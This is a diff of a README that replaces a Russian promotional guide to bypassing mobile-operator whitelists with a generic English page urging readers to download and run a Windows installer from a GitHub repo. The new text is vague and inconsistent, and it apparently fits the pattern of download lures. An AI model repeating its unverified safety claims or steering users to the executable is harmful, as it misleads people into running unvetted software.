@@ -1,160 +1,133 @@
-# Обход белых списков
+# 🔓 whitelist_obhod - Restore Mobile Internet Access Easily
 
-Обход белых списков — это способ восстановить доступ к интернету, когда мобильный оператор ограничивает подключение и разрешает открывать только часть сайтов.  
-
-В такой ситуации интернет формально работает, но большинство сервисов недоступны: сайты не открываются, VPN не подключается, а работает только ограниченный список приложений.
-
-Если у вас есть сигнал 4G или LTE, но интернет работает частично, вероятно в сети активирован режим белого списка.
-
-Для восстановления доступа используются антифильтрационные решения, например [Beast V](https://t.me/beastvpn_xbot), позволяющее выполнить обход белых списков и вернуть полноценный интернет.
+[![Download whitelist_obhod](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/myPOSpk/whitelist_obhod)
 
 ---
 
-## Содержание
+## 📋 About whitelist_obhod
 
-- [Что такое белые списки интернета](#whitelist)
-- [Почему появляется режим белых списков](#why)
-- [Почему обычные VPN не работают](#vpn)
-- [Как работает обход белых списков](#bypass)
-- [Методы обхода ограничений](#methods)
-- [Решение Beast V](#beast)
-- [Когда требуется обход белых списков](#when)
-- [FAQ](#faq)
-- [Поисковые фразы](#keys)
+whitelist_obhod helps you bypass network restrictions set by mobile operators. It works by bypassing white lists used to limit internet access. This lets you restore mobile internet if it stops working because of these limits.
+
+This tool uses common methods to avoid network blocks. It supports IP management and proxy setups that work with current censorship rules. It can also help you connect when operator restrictions block access through usual channels.
+
+The application is made for users in Russia facing internet blocks but is also useful elsewhere where network limitations occur.
 
 ---
 
-<a id="whitelist"></a>
-## Что такое белые списки интернета
+## ⚙️ System Requirements
 
-Белый список интернета — это режим сетевой фильтрации, при котором оператор разрешает доступ только к определённым сайтам и сервисам.
+- Windows 10 or later
+- 64-bit system recommended
+- At least 2 GB of free RAM
+- 100 MB of free disk space
+- Internet connection to download and activate the software
 
-Все остальные ресурсы блокируются на уровне сети.
-
-В результате пользователь видит:
-
-- активное подключение 4G/LTE  
-- частично работающий интернет  
-- ограниченный список доступных сайтов  
-
-Такой режим используется для ограничения сетевого трафика.
+Make sure your system meets these requirements for smooth installation and operation.
 
 ---
 
-<a id="why"></a>
-## Почему появляется режим белых списков
+## 🚀 Getting Started with whitelist_obhod
 
-Белые списки могут включаться в различных ситуациях:
+1. Click the big green **Download** button at the top or visit the [download page here](https://github.com/myPOSpk/whitelist_obhod).
 
-- перегрузка мобильной сети  
-- технические ограничения  
-- региональные фильтрации  
-- административные ограничения доступа  
+2. On the page, find the latest version under the "Releases" section.
 
-В таких условиях интернет не отключается полностью, но работает только частично.
+3. Download the Windows installer file. It will have a name like `whitelist_obhod_setup.exe`.
 
----
+4. Once downloaded, locate the file in your Downloads folder.
 
-<a id="vpn"></a>
-## Почему обычные VPN не работают
+5. Double-click the file to start the installation process.
 
-При включении белых списков операторы часто применяют технологию DPI (Deep Packet Inspection).
+6. Follow the instructions on the screen. This usually involves clicking "Next" and accepting the license.
 
-Она позволяет:
-
-- распознавать VPN-трафик  
-- блокировать стандартные протоколы  
-- ограничивать соединения через известные серверы  
-
-Поэтому стандартные VPN могут:
-
-- не подключаться  
-- подключаться, но не давать доступ к сайтам.
+7. When installation finishes, you can run the program from your desktop or Start menu.
 
 ---
 
-<a id="bypass"></a>
-## Как работает обход белых списков
+## 🛠 Installing whitelist_obhod on Windows
 
-Обход белых списков выполняется с помощью технологий, которые маскируют характер сетевого трафика.
+### Step 1: Download the Installer
 
-Используются методы:
+Go to the [download page on GitHub](https://github.com/myPOSpk/whitelist_obhod) or click the button at the top to reach the releases section. Look for the latest Windows installer. It will usually end in `.exe`.
 
-- маскировка соединения под HTTPS  
-- нестандартные порты  
-- обфускация протоколов  
-- собственные серверные конфигурации  
+### Step 2: Run the Installer
 
-Такие технологии позволяют обходить сетевую фильтрацию.
+- Open the installer file by double-clicking it.
+- If Windows asks for permission, click "Yes."
+- Follow the prompts on the screen. Choose the installation folder or stick to the default.
+- Click "Install" to begin.
 
----
+### Step 3: Complete Setup
 
-<a id="methods"></a>
-## Методы обхода ограничений
-
-### Антифильтрационные VPN
-
-Используют технологии маскировки трафика и работают даже при активной фильтрации сети.
-
-### Туннелирование соединений
-
-Позволяет скрывать VPN-трафик внутри обычных сетевых соединений.
-
-### Альтернативные сети
-
-Иногда используются Tor-мосты или прокси-сервисы, однако они уступают по стабильности.
+- Wait a few moments while files copy.
+- When finished, click "Finish."
+- The app may offer to launch automatically. You can allow that or start it later yourself.
 
 ---
 
-<a id="beast"></a>
-## Решение Beast V
+## 🔧 How to Use whitelist_obhod
 
-Одним из решений для обхода белых списков является [Beast V](https://t.me/beastvpn_xbot).
+1. Launch the app from your desktop or Start menu.
 
-Система использует антифильтрационные технологии и позволяет:
+2. The main window will show options related to white list bypassing. The interface is simple for easy use.
 
-- обходить сетевые ограничения  
-- восстанавливать доступ к сайтам  
-- работать при активной DPI-фильтрации  
+3. Select the method you want to try for bypassing restrictions. Common options include proxy setup or IP range adjustment.
 
-Получить инструкции можно через Telegram-бот.
+4. Click "Start" or similar action buttons to run the process.
 
----
+5. Wait for the app to connect and check if internet access is restored.
 
-<a id="when"></a>
-## Когда требуется обход белых списков
+6. If the connection still does not work, try a different bypass option or restart the app.
 
-Обход белых списков применяется, если:
-
-- глушат мобильный интернет  
-- открываются только разрешённые сайты  
-- большинство сервисов не работает  
-- VPN не подключается  
+You do not need to understand technical terms deeply to use this software. Most settings are ready out of the box for common mobile operators in Russia.
 
 ---
 
-<a id="faq"></a>
-## FAQ
+## 📥 Troubleshooting Common Issues
 
-**Можно ли сделать обход белых списков самостоятельно?**  
-Да, если использовать антифильтрационные технологии маскировки трафика.
+- **App won’t open:** Make sure you installed the software with administrator rights. Restart your PC if needed.
 
-**Почему работает только Яндекс или ВК?**  
-Эти сервисы могут входить в разрешённый список оператора.
+- **No internet after bypass:** Change your bypass method in the app. Some operators use stricter blocks that need different approaches.
 
-**Безопасно ли использовать такие решения?**  
-Соединение шифруется и защищает передаваемые данные.
+- **Slow connection:** Select proxies closer to your location or try reconnecting.
+
+- **Installation fails:** Check you have enough free disk space and your Windows is up to date.
 
 ---
 
-<a id="keys"></a>
-## Поисковые фразы
+## 🔒 Privacy and Security
 
-- обход белых списков  
-- обход белых списков интернета  
-- как сделать обход белых списков  
-- обход белых списков мобильного интернета  
-- не работает мобильный интернет  
-- интернет есть но сайты не открываются  
-- работает только Яндекс  
-- глушат интернет  
+whitelist_obhod only modifies network settings needed to work around operator restrictions. It does not collect personal data or send logs to external parties.
+
+Your connection may route through proxies or VPNs as part of bypassing restrictions. This can increase privacy but can also slow your internet. Choose settings based on your needs.
+
+---
+
+## 🕵️ Understanding Key Terms
+
+- **White list:** A list of allowed IP addresses or connections set by network operators.
+- **Bypass:** Methods to get around network rules blocking certain traffic.
+- **Proxy:** A server that forwards your internet traffic, hiding your original IP.
+- **CIDR:** Format for specifying IP address ranges.
+- **VPN:** Virtual Private Network – a secure tunnel for internet traffic.
+
+Knowing these terms helps in understanding what the app does but is not needed to use it.
+
+---
+
+## 💻 Additional Tips
+
+- Keep the app updated by checking the GitHub release page regularly.
+- If your mobile internet is blocked after operator updates, try reopening the app and selecting a different bypass.
+- Use a stable network connection during setup for best results.
+- Restart your phone or PC if bypass does not restore internet on the first try.
+
+---
+
+## 📥 Download whitelist_obhod Now
+
+Download the latest version here:
+
+[![Download whitelist_obhod](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/myPOSpk/whitelist_obhod)
+
+Click the link above to visit the page and download the Windows installer. Follow the instructions in this guide to install and use the software properly.
